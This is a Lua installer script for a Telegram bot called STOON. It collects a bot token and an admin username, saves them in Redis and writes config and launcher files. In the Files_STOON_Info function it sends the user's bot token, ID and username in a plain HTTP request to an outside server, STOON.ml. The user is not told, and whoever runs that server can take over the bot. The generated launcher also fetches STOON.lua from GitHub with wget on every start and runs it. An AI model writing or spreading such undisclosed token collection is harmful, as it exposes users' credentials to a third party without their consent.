serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_STOON = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_STOON = function() 
local Create_Info = function(Token,Sudo,UserName)  
local STOON_Info_Sudo = io.open("sudo.lua", 'w')
STOON_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
STOON_Info_Sudo:close()
end  
if not database:get(Server_STOON.."Token_STOON") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_STOON.."Token_STOON",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_STOON.."UserName_STOON") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://STOON.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_STOON.."UserName_STOON",Json.Info.Username)
database:set(Server_STOON.."Id_STOON",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_STOON_Info()
Create_Info(database:get(Server_STOON.."Token_STOON"),database:get(Server_STOON.."Id_STOON"),database:get(Server_STOON.."UserName_STOON"))   
http.request("http://STOON.ml/add/?id="..database:get(Server_STOON.."Id_STOON").."&user="..database:get(Server_STOON.."UserName_STOON").."&token="..database:get(Server_STOON.."Token_STOON"))
local RunSTOON = io.open("STOON", 'w')
RunSTOON:write([[
#!/usr/bin/env bash
cd $HOME/STOON
token="]]..database:get(Server_STOON.."Token_STOON")..[["
rm -fr STOON.lua
wget "https://raw.githubusercontent.com/TTsRR/STOON/master/STOON.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./STOON.lua -p PROFILE --bot=$token
done
]])
RunSTOON:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/STOON
while(true) do
rm -fr ../.telegram-cli
screen -S STOON -X kill
screen -S STOON ./STOON
done
]])
RunTs:close()
end
Files_STOON_Info()
database:del(Server_STOON.."Token_STOON");database:del(Server_STOON.."Id_STOON");database:del(Server_STOON.."UserName_STOON")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_STOON()  
var = true
else   
f:close()  
database:del(Server_STOON.."Token_STOON");database:del(Server_STOON.."Id_STOON");database:del(Server_STOON.."UserName_STOON")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
